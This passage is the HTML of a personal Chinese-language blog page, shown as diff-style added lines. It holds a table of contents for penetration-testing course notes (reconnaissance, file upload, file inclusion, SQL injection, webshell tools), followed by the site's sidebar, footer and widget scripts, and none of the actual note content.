href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E5%90%88"><span class="nav-number">2.1.1.</span> <span class="nav-text">综合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">搜索引擎利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#google-hacking"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">google hacking</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.3.</span> <span class="nav-text">主机信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E7%9A%84"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">目的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%EF%BC%9A"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">常见端口：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.3.3.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#masscan"><span class="nav-number">2.1.3.4.</span> <span class="nav-text">masscan</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">2.1.3.5.</span> <span class="nav-text">系统识别小技巧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">2.1.4.</span> <span class="nav-text">指纹识别</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BFWeb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">在线Web指纹识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#whatweb"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">whatweb</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">2.1.4.3.</span> <span class="nav-text">操作系统指纹识别</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Banner%E6%8A%93%E5%8F%96"><span class="nav-number">2.1.4.3.1.</span> <span class="nav-text">Banner抓取</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E8%AF%86%E5%88%AB"><span class="nav-number">2.1.5.</span> <span class="nav-text">WAF识别</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">识别工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E5%88%AB%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.5.3.</span> <span class="nav-text">判别方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%80%E5%B7%A7"><span class="nav-number">2.1.5.4.</span> <span class="nav-text">技巧</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BP"><span class="nav-number">2.1.6.</span> <span class="nav-text">BP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">2.1.7.</span> <span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A"><span class="nav-number">2.1.8.</span> <span class="nav-text">课后作业</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85AntSword"><span class="nav-number">2.1.8.1.</span> <span class="nav-text">安装AntSword</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E5%86%B0%E8%9D%8E"><span class="nav-number">2.1.8.2.</span> <span class="nav-text">安装冰蝎</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A97-8"><span class="nav-number">3.</span> <span class="nav-text">第二天7.8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">webshell工具的使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="nav-number">3.3.</span> <span class="nav-text">服务器根目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="nav-number">3.4.</span> <span class="nav-text">客户端检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">3.4.1.</span> <span class="nav-text">绕过黑名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">3.4.2.</span> <span class="nav-text">配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E7%89%B9%E6%80%A7"><span class="nav-number">3.4.3.</span> <span class="nav-text">windows特性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%A4%A97-9"><span class="nav-number">4.</span> <span class="nav-text">第三天7.9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">4.0.1.</span> <span class="nav-text">白名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#url%E7%BC%96%E7%A0%81"><span class="nav-number">4.0.1.1.</span> <span class="nav-text">url编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.0.2.</span> <span class="nav-text">文件上传其他漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="nav-number">4.0.2.1.</span> <span class="nav-text">文件内容检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.0.3.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">4.0.3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">4.0.3.2.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">4.0.3.3.</span> <span class="nav-text">伪协议</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%A4%A97-10"><span class="nav-number">5.</span> <span class="nav-text">第四天7.10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">5.1.1.</span> <span class="nav-text">联合查询常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%AF%A6%E8%A7%A3"><span class="nav-number">5.1.2.</span> <span class="nav-text">联合查询详解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">5.1.3.</span> <span class="nav-text">sqlmap的使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%A4%A9"><span class="nav-number">6.</span> <span class="nav-text">第五天</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.1.</span> <span class="nav-text">代码执行漏洞</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="YeZi"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">YeZi</p>
+  <div class="site-description" itemprop="description">分享生活，分享技术</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Ye1133Zi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ye1133Zi" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">叶子</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">38k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">34 分钟</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+</html>
